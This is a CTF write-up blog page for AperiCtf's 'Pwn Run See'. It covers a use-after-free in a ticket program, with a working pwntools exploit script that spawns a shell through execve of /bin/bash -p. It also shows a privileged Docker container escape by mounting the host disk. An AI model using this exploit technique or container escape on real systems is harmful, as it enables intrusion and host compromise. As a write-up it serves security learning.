@@ -1,0 +1,1554 @@
+<!DOCTYPE html>
+<html lang="en-en">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.52 with theme Tranquilpeak 0.4.3-SNAPSHOT">
+<meta name="author" content="Hugo VINCENT">
+<meta name="keywords" content="pwn, UAF, docker, blog, hacking, Privacy, vie-privée, insa, cybersecurity, infosec, hack">
+<meta name="description" content="Event Challenge Category Points Solves     AperiCtf PwnRunSee 1 pwn 175 5   AperiCtf PwnRunSee 2 pwn 250 2    TL;DR This challenge was a use after free vulnerability which allow the user to get a shell on the remote docker after a call to execve with some user controlled parameters. Once inside the docker, we can abuse some privileges to mount the host disk inside the container and get the last flag.">
+
+
+<meta property="og:description" content="Event Challenge Category Points Solves     AperiCtf PwnRunSee 1 pwn 175 5   AperiCtf PwnRunSee 2 pwn 250 2    TL;DR This challenge was a use after free vulnerability which allow the user to get a shell on the remote docker after a call to execve with some user controlled parameters. Once inside the docker, we can abuse some privileges to mount the host disk inside the container and get the last flag.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn Run See (part 1 &amp; 2)">
+<meta name="twitter:title" content="Pwn Run See (part 1 &amp; 2)">
+<meta property="og:url" content="https://hug0vincent.github.io/2019/10/pwn-run-see-part-1-2/">
+<meta property="twitter:url" content="https://hug0vincent.github.io/2019/10/pwn-run-see-part-1-2/">
+<meta property="og:site_name" content="Hugo">
+<meta property="og:description" content="Event Challenge Category Points Solves     AperiCtf PwnRunSee 1 pwn 175 5   AperiCtf PwnRunSee 2 pwn 250 2    TL;DR This challenge was a use after free vulnerability which allow the user to get a shell on the remote docker after a call to execve with some user controlled parameters. Once inside the docker, we can abuse some privileges to mount the host disk inside the container and get the last flag.">
+<meta name="twitter:description" content="Event Challenge Category Points Solves     AperiCtf PwnRunSee 1 pwn 175 5   AperiCtf PwnRunSee 2 pwn 250 2    TL;DR This challenge was a use after free vulnerability which allow the user to get a shell on the remote docker after a call to execve with some user controlled parameters. Once inside the docker, we can abuse some privileges to mount the host disk inside the container and get the last flag.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2019-10-09T11:39:54">
+  
+  
+    <meta property="article:modified_time" content="2019-10-09T11:39:54">
+  
+  
+  
+    
+      <meta property="article:section" content="write-ups">
+    
+      <meta property="article:section" content="AperiCtf">
+    
+  
+  
+    
+      <meta property="article:tag" content="pwn">
+    
+      <meta property="article:tag" content="UAF">
+    
+      <meta property="article:tag" content="docker">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://hug0vincent.github.io/images/PwnRunSee/memory.png">
+  <meta property="twitter:image" content="https://hug0vincent.github.io/images/PwnRunSee/memory.png">
+
+
+
+
+  <meta property="og:image" content="https://hug0vincent.github.io/images/profil.jpg">
+  <meta property="twitter:image" content="https://hug0vincent.github.io/images/profil.jpg">
+
+
+    <title>Pwn Run See (part 1 &amp; 2)</title>
+
+    <link rel="icon" href="https://hug0vincent.github.io/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://hug0vincent.github.io/2019/10/pwn-run-see-part-1-2/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+
+    
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,300i,400,700,700i&amp;subset=cyrillic,cyrillic-ext,latin-ext" rel="stylesheet"> 
+
+    
+    <link rel="stylesheet" href="https://hug0vincent.github.io/css/style-2wfjlq5nwe9qjygqo9yarila7qvjwdmv.min.css" />
+    
+    
+      
+        <link rel="stylesheet"  href="https://hug0vincent.github.io/css/custom.css">
+      
+    
+
+    
+      
+    
+    
+
+    <script type="text/javascript">
+      window.heap=window.heap||[],heap.load=function(e,t){window.heap.appid=e,window.heap.config=t=t||{};var r=t.forceSSL||"https:"===document.location.protocol,a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src=(r?"https:":"http:")+"//cdn.heapanalytics.com/js/heap-"+e+".js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(a,n);for(var o=function(e){return function(){heap.push([e].concat(Array.prototype.slice.call(arguments,0)))}},p=["addEventProperties","addUserProperties","clearEventProperties","identify","resetIdentity","removeEventProperty","setEventProperties","track","unsetEventProperty"],c=0;c<p.length;c++)heap[p[c]]=o(p[c])};
+        heap.load("381812841");
+  </script>
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://hug0vincent.github.io/">Hugo</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://hug0vincent.github.io/page/about/">
+    
+    
+    
+      
+        <img class="header-picture" src="https://hug0vincent.github.io/images/profil.jpg" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://hug0vincent.github.io/page/about/">
+          <img class="sidebar-profile-picture" src="https://hug0vincent.github.io/images/profil.jpg" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Hugo VINCENT</h4>
+        
+          <h5 class="sidebar-profile-bio">Student in computer security</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/categories/posts">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-pencil"></i>
+      
+      <span class="sidebar-button-desc">Posts</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/categories/write-ups">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Write-Ups</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://hug0vincent.github.io/page/about/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/Hug0Vincent" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.root-me.org/hugow?lang=fr#70a472fd3f9279cb9095ce7cbd2cad00" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon rootme_logo "></i>
+      
+      <span class="sidebar-button-desc">Root-me</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/hugow_vincent" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.instagram.com/hugo_vincent__/" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-instagram "></i>
+      
+      <span class="sidebar-button-desc">Instagram</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              post-header-cover--full"
+       style="background-image:url('/images/PwnRunSee/memory.png')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title" itemprop="headline">
+      Pwn Run See (part 1 &amp; 2)
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2019-10-09T11:39:54&#43;02:00">
+        
+  October 9, 2019
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://hug0vincent.github.io/categories/write-ups">write-ups</a>, 
+    
+      <a class="category-link" href="https://hug0vincent.github.io/categories/aperictf">AperiCtf</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              
+
+<table>
+<thead>
+<tr>
+<th align="center">Event</th>
+<th align="center">Challenge</th>
+<th align="center">Category</th>
+<th align="center">Points</th>
+<th align="center">Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td align="center">AperiCtf</td>
+<td align="center">PwnRunSee 1</td>
+<td align="center">pwn</td>
+<td align="center">175</td>
+<td align="center">5</td>
+</tr>
+
+<tr>
+<td align="center">AperiCtf</td>
+<td align="center">PwnRunSee 2</td>
+<td align="center">pwn</td>
+<td align="center">250</td>
+<td align="center">2</td>
+</tr>
+</tbody>
+</table>
+
+<h1 id="tl-dr">TL;DR</h1>
+
+<p>This challenge was a use after free vulnerability which allow the user to get a shell on the remote docker after a call to execve with some user controlled parameters. Once inside the docker, we can abuse some privileges to mount the host disk inside the container and get the last flag.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>The <a href="https://hug0vincent.github.io/files/PwnRunSee/chall.c">program</a> allows the user to create some tickets which will then be processed by some users depending of the ticket destination. If the ticket destination isn&rsquo;t a valid one a &ldquo;Intern&rdquo; is hired to process the ticket then fired.</p>
+
+<p>
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure fig-50" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/PwnRunSee/choice1.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/PwnRunSee/choice1.png" >
+  
+    </a>
+  
+  
+</div>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure fig-50" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/PwnRunSee/choice3.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/PwnRunSee/choice3.png" >
+  
+    </a>
+  
+  
+</div>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure fig-25" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/PwnRunSee/choice2.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/PwnRunSee/choice2.png" >
+  
+    </a>
+  
+  
+</div>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure fig-25" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/PwnRunSee/choice4.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/PwnRunSee/choice4.png" >
+  
+    </a>
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+</p>
+
+<p></br></p>
+
+<p>Agents are stored in a linked list, each agent has a pointer to the next agent and to the previous agent. If there is no previous/next agent it points to NULL. By default, there are 2 agents, the founder and Moss.</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">typedef struct Agent_t {
+    char name[12];  // the name of the agent
+    char service[4];  // the service to which the agent belongs (basically ADM/USR)
+    void (*run_task)();
+    char task[12];  // what the agent is able to do?
+    int ticket_count;  // how many tickets this agent has processed?
+    struct Agent_t *predecessor;  // which agent has joined the company before him?
+    struct Agent_t *successor;  // which agent has joined the company after him?
+} Agent_t;</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>After looking at the code we can spot a vulnerability, in the <span class="highlight-text orange">fire_interns</span> function the intern is freed, but the linked list is not updated so the successor of the previous agent (Moss if it&rsquo;s the first intern) will point to a free memory area. When an object is freed, the object itself is not destroyed and the content of the object remain intact.</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">// Interns aren&#39;t really useful isn&#39;t it?
+void fire_interns() {
+    Agent_t *agent = NULL;
+    Agent_t *next = NULL;
+
+    agent = founder;
+    while (agent != NULL) {
+        printf(&#34;Looking %s for firing\n&#34;, agent-&gt;name);
+        next = agent-&gt;successor;
+        // TODO: update linked list.
+        if (strcmp(agent-&gt;name, &#34;Intern&#34;) == 0) {
+            printf(&#34;%s has been fired\n&#34;, agent-&gt;name);
+            //Here agent freed but list not updated !!
+            free(agent);
+        }
+        agent = next;
+    }
+}</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>So now when we create a new ticket, it will point to the same memory area than the previous freed agent. Here is an example, first you create a useless ticket, then you ask the agents to process the ticket in order to create the Intern agent. Now there are no tickets left and the intern agent is freed. Here is what happen if you create another ticket and display the agent list :</p>
+
+<p>
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure fig-50" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/PwnRunSee/overflow1.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/PwnRunSee/overflow1.png" >
+  
+    </a>
+  
+  
+</div>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure fig-50" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/PwnRunSee/overflow2.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/PwnRunSee/overflow2.png" >
+  
+    </a>
+  
+  
+</div>
+</p>
+
+<p>We can control the content of the agent ! It&rsquo;s time for exploitation.</p>
+
+<h1 id="building-the-exploit">Building the exploit</h1>
+
+<p>Here is the representation of the memory. The red arrows show the memory when the intern has been hired. The purple arrow show the memory when the intern has been freed and when a new ticket is created. The successor pointer of Moss will point to the created ticket and it will be interpreted as an agent. Thanks to that we can control the structure of the agent and put what we want inside.</p>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+
+<div class="figure  fig-100" >
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/PwnRunSee/memory.png" >
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<p>Now we need to create this special ticket in order to change the intern&rsquo;s parameters and get him execute a shell on the remote docker. What we want to achieve is a call to <span class="highlight-text orange">execve</span> in the <span class="highlight-text orange">run_task</span>function.</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">void run_task(Agent_t *agent, Ticket_t *ticket) {
+    if (strcmp(agent-&gt;service, &#34;ADM&#34;) == 0) {
+        if (strcmp(agent-&gt;name, &#34;Moss&#34;) == 0 || agent-&gt;ticket_count &lt; 1) {  // don&#39;t accept commands if it&#39;s its first ticket!
+            printf(&#34;Sorry %s, but you&#39;re really dangerous... I&#39;m calling the 01189998819991197253!\n&#34;, agent-&gt;name);
+        } else {
+            printf(&#34;%s agent is processing the task...\n&#34;, agent-&gt;name);
+
+            char *argv[] = {agent-&gt;task, ticket-&gt;description, NULL};
+            //could be nice to call it with /bin/sh ? :D
+            execve(agent-&gt;task, argv, NULL);
+        }
+    } else {
+        printf(&#34;%s agent isn&#39;t admin!\n&#34;, agent-&gt;name);
+    }
+}</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>The run_task function is called from <span class="highlight-text orange">process_tickets</span>. It loops over all the tickets and look for a valid agent. When the agent has processed the ticket his ticket counter is increased by one.</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">[...]
+agent = find_agent(ticket-&gt;to);
+if (agent == NULL) {
+    [...]
+} else {
+    [...]
+    agent-&gt;run_task(agent, ticket);
+    agent-&gt;ticket_count &#43;= 1;
+}</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>But, how the agents are selected in <span class="highlight-text orange">find_agent</span> ? Here is the code responsible for that, first it compares the service of the agent and then check that the ticket count of the agent is lower than MAX_AGENT_TICKET (which is 4 here).</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">agent = founder;
+    while (agent != NULL &amp;&amp; found_agent == NULL) {
+        if (strcmp(agent-&gt;service, service) == 0 &amp;&amp; agent-&gt;ticket_count &lt; MAX_AGENT_TICKET) {
+            found_agent = agent;
+        } else {
+            agent = agent-&gt;successor;
+        }
+    }</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>So if we just craft the intern with service <span class="highlight-text orange">ADM</span> it won&rsquo;t work because Moss will be selected since it takes the agent list from the beginning to the end (Intern is the last one). We need to make Moss busy. The ticket count of Moss need to be bigger than MAX_AGENT_TICKET so he can&rsquo;t process other tickets, this will make find_agent return the intern.</p>
+
+<p>Before getting access to execve in run_task, some conditions are needed. The agent has to be an admin, the agent can&rsquo;t be Moss and the ticket count should be greater than 1:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">[...]
+if (strcmp(agent-&gt;service, &#34;ADM&#34;) == 0) {
+    if (strcmp(agent-&gt;name, &#34;Moss&#34;) == 0 || agent-&gt;ticket_count &lt; 1) {  
+        // don&#39;t accept commands if it&#39;s its first ticket!
+[...]</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>So the idea of the exploit is :</p>
+
+<ul>
+<li>Create fake ticket for Moss to make him busy</li>
+<li>Create fake ticket for the intern in order to create him</li>
+<li>Process tickets</li>
+<li>Create special ticket to overwrite intern&rsquo;s params</li>
+<li>Create the shell ticket</li>
+<li>Process the tickets and enjoy your shell !</li>
+</ul>
+
+<p>After overwriting the intern&rsquo;s params we will end up executing this command :</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">char *argv[] = {&#34;/bin/bash&#34;, &#34;-p&#34;, NULL};
+            execve(&#34;/bin/bash&#34;, argv, NULL);</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+
+
+<div class="figure center fig-100" >
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/PwnRunSee/params.png" >
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<h1 id="exploit">Exploit</h1>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight python language-python">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-python"><code class="python">from pwn import *
+
+#Static address in the binary
+#Found by looking at other agents
+run_task = 0x804871b
+binary = &#34;chall&#34;
+
+#HOST = &#34;pwn-run-see.aperictf.fr&#34;
+HOST = &#34;localhost&#34;
+PORT = 31337
+
+#Create a ticket
+def createTicket(name, dest, descrip, p):
+	p.recvuntil(&#34;name: &#34;)
+	p.sendline(name)
+	p.recvuntil(&#34;service: &#34;)
+	p.sendline(dest)
+	p.recvuntil(&#34;ion: &#34;)
+	p.sendline(descrip)
+	p.recvuntil(&#34;=&gt; &#34;)
+
+p = remote(HOST, PORT)
+
+#Make Moss Busy to make is ticket count &gt; MAX_AGENT_TICKET
+#so he can&#39;t process other tickets
+for i in range(0, 5):
+    p.sendline(&#34;3&#34;)
+    createTicket(&#34;AAAA&#34;, &#34;ADM&#34;, &#34;AAAA&#34;, p)
+
+#Process tickets and free Intern
+p.sendline(&#34;4&#34;)
+p.recvuntil(&#34;=&gt; &#34;)
+p.sendline(&#34;3&#34;)
+
+#Create the Special ticket with /bin/bash to change intern&#39;s params
+createTicket(&#34;AAAA&#34;, &#34;ADM&#34;, p32(run_task)&#43;&#34;/bin/bash&#34;, p)
+p.sendline(&#34;3&#34;)
+
+#Create the ticket to trigger the execve 
+createTicket(&#34;AAAA&#34;, &#34;ADM&#34;, &#34;-p&#34;, p)
+p.sendline(&#34;4&#34;)
+p.interactive()
+print p.recvuntil(&#34;=&gt; &#34;)</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+
+
+<div class="figure center fig-100" >
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/PwnRunSee/shell.png" style="width: 80%;height: 80%;">
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<h1 id="part-2">Part 2</h1>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+
+<div class="figure  center fig-100" >
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/PwnRunSee/part2.png" style="width: 50%;height: 50%;">
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<p>So we end up part 1 with a shell, but we need to escape from the container. I&rsquo;m not an expert in docker, but we can quickly spot the <span class="highlight-text orange">privileged: true</span> in the dockercompose.yml which sound promising !</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight json language-json">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-json"><code class="json">#
+# Pwn, run, see.
+#
+# Written by:
+#   Baptiste MOINE &lt;contact@bmoine.fr&gt;
+#
+version: &#39;3&#39;
+networks:
+    front:
+        driver: bridge
+services:
+    xinetd:
+        build: build/xinetd
+        image: creased/xinetd:latest
+        container_name: ${COMPOSE_PROJECT_NAME:-chall}
+        hostname: ${COMPOSE_PROJECT_NAME:-chall}
+        ports:
+            - 31337:31337/tcp
+        networks:
+            front:
+            #    ipv4_address: 10.0.0.1
+        restart: always
+        volumes:
+            - ${ROOT:-.}/data/chall/chall:/data/chall:ro
+            - ${ROOT:-.}/data/chall/flag:/data/flag:ro
+            - ${ROOT:-.}/conf/xinetd/ctf.xinetd:/etc/xinetd.d/ctf:ro
+            - ${ROOT:-.}/conf/xinetd/xinetd.conf:/etc/xinetd.conf:ro
+        privileged: true
+        healthcheck:
+            test: [&#34;CMD&#34;, &#34;nc&#34;, &#34;-z&#34;, &#34;localhost&#34;, &#34;31337&#34;]
+            interval: 10s
+            timeout: 10s
+            retries: 3</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>After some research on duckduckgo I discovered some warning about using this option. From the official docker website :</p>
+
+<blockquote class="pullquote ">
+	<p>
+When the operator executes docker run --privileged, Docker will enable access to all devices on the host as well as set some configuration in AppArmor or SELinux to allow the container nearly all the same access to the host as processes running outside containers on the host. 
+</p>
+</blockquote>
+
+<p>Indeed we can access all the devices, to see them just use <code>ls /dev</code>. In the device, there is <span class="highlight-text orange">/dev/sda1</span> which is the host partition !! To access this partition and escape the container we just need to mount it:</p>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight bash language-bash">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-bash"><code class="bash">mkdir /mountDir
+mount /dev/sda1 /mountDir
+ls /mountDir/</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+
+<div class="figure  center fig-100" >
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/PwnRunSee/last2.png" >
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+<p>I&rsquo;m currently using a Mac, with mac and windows systems the docker daemon run in a VM so we can&rsquo;t really see the host partition, but on a linux machine we would have had access to the whole partition !</p>
+
+
+ 
+  
+  
+  
